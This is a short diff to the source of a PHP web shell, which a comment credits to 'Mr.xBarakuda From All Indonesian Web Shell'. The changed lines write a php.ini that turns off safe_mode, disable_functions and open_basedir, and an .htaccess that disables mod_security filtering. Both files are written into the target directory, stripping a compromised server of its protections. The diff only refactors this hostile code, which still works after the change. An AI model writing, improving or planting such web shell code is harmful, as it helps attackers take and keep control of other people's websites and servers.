@@ -349,18 +349,11 @@ if (isset($_SERVER['HTTP_X_WEB_FACTOR']) && stripos($_SERVER['HTTP_X_WEB_FACTOR'
 </head>
 <?php
 // Code by Mr.xBarakuda From All Indonesian Web Shell
-if (file_exists('php.ini')) {
-} else {
-  $img = fopen('php.ini', 'w');
-  $sec = "safe_mode = OFF\ndisable_functions = NONE\nsafe_mode_gid = OFF\nsafe_mode_include_dir = OFF\nsafe_mode_exec_dir = OFF\nopen_basedir = OFF";
-  fwrite($img, $sec);
-  fclose($img);
+if (!file_exists($dir . '/php.ini')) {
+    @file_put_contents($dir . '/php.ini', "safe_mode = OFF\ndisable_functions = NONE\nsafe_mode_gid = OFF\nsafe_mode_include_dir = OFF\nsafe_mode_exec_dir = OFF\nopen_basedir = OFF");
 }
-if (!file_exists('.htaccess')) {
-  $ht = fopen('.htaccess', 'w');
-  $isian = "<IfModule mod_security.c>\nSecFilterEngine Off\nSecFilterScanPOST Off\n</IfModule>";
-  fwrite($ht, $isian);
-  fclose($ht);
+if (!file_exists($dir . '/.htaccess')) {
+    @file_put_contents($dir . '/.htaccess', "<IfModule mod_security.c>\nSecFilterEngine Off\nSecFilterScanPOST Off\n</IfModule>");
 }
 function w($dir, $perm) {
   if (!is_writable($dir)) {
